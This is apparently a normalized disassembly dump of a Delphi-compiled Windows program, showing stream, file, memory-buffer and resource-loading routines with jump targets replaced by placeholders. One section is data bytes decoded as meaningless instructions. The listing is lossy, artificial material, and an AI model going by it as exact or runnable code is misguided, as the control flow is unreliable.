call sub_41ad08
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41adb8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41ae14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41ad08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41ae68
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41ae9c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41af00
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41af54
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403200
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
mov esp ebp
pop ebp
retn
sub_41afa0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031f8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41af54
pop ecx
mov eax [ ebx ]
call sub_40323c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41af54
pop ecx
sub_41b024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b094
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_41b0cc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_41b104
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41ae88
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b1e0
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1e7
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b094
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b0cc
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b1f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b248
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d914
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b24f
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_41b260
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b2b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b2b7
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_41b2bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41b318
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4086e8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b358
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d0a4
pop ebx
pop ebp
retn 0x8
sub_41b380
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b3c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41b3c4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b4ed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
movzx edx di
mov eax esi
call sub_40860c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b2bc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408688
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b2bc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4f4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_4040d0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408858
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b2d4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408858
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b2d4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
jmp r-xdata
sub_41b4f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41b518
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
call sub_408720
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41b554
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028e8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b58c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b5b0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_41b5dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41b5f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41ae88
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b094
sub_41b62c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b54c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b654
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b62c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b680
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406cbc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406ca0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406c90
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
test ecx ecx
jne r-xdata
sub_41b70c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028e8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b62c
sub_41b75c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40456c
mov ecx eax
mov edx esi
mov eax edi
call sub_41b824
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41b7b4
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b817
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b81e
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_41b824
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b7b4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b54c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b7b4
pop ecx
sub_41b890
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c8c
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41b8e0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026ec
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41b928
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_40270c
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41b958
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x180041b9
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
mov edx 0xe0041
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x23ffbfce ] ah
mov edx 0x540e0041
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
sbb [ edx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xba
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edi * 4 + 0x41 ] dl
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40419c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40460c
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404100
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ba2c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404100
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41ba84
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40419c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40460c
mov al 0x1
inc ebx
sub_41badc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bb53
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405944
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb5a
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414ba0
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405944
mov ecx eax
mov eax esi
pop edx
call sub_40d598
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405944
sub_41bb60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41bc06
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc0d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_421878
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408020
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41bc28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418a0c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418a0c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418854
sub_41bc60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418a0c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418a0c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4188a0
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418854
sub_41bca8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41be41
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418d74
mov edi eax
xor edx edx
push ebp
push sub_41be22
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be29
mov eax [ rw-data ]
call sub_418dd8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41be03
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41bdb1
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4189b0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_418370
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bdb8
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414e28
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bc28
pop ecx
mov edx esi
mov eax edi
call sub_4188a0
mov eax ebx
call sub_4032b0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41bb60
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bc60
pop ecx
inc esi
sub_41bdb8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
